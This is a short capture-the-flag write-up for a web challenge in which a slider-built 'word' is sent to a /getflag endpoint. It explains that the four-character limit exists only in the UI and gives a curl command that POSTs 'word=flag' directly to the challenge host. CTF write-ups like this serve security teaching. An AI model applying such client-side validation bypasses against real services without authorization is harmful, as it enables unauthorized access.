## TL;DR

The page uses sliders to build a 4-character `word` and sends it to `POST /getflag`.
The request format is visible in the frontend JS, so we can skip the UI and send any `word` we want directly.
Sending `word=flag` returns the flag.

---

## Overview

The page builds a 4-character `word` from slider values and sends it to the server.
The real question is: **what input does `/getflag` need to return the flag?**

- **Endpoint:** `POST /getflag`
- **Content-Type:** `application/x-www-form-urlencoded`
- **Body:** `word=<...>`

---

## Solution

### 1) Recon

Looking at the frontend JS or browser DevTools Network tab, the request is:

```js
fetch("/getflag", { method: "POST", body: "word=..." })
```

The format is fully exposed, so we can replicate the request directly without using the UI.

### 2) Root Cause

The 4-character limit is a **UI constraint only** — it has no server-side enforcement.
The server trusts whatever `word` value it receives, and responds with the flag for a specific input.
Since the client can never be trusted, an attacker can simply send any value they want.

### 3) Exploit

Bypass the UI and POST `word=flag` directly:

```bash
curl -s -X POST 'https://the-trial.chall.lac.tf/getflag' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'word=flag'
```

### 4) Why it works

The request format is exposed in the frontend JS, and the server has no validation beyond checking the `word` value itself.
The UI's 4-character restriction is meaningless because the server accepts any input — including `word=flag`, which triggers the flag response.

---

## Solver

No script needed — one curl command is enough.

```bash
curl -s -X POST 'https://the-trial.chall.lac.tf/getflag' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'word=flag'
```
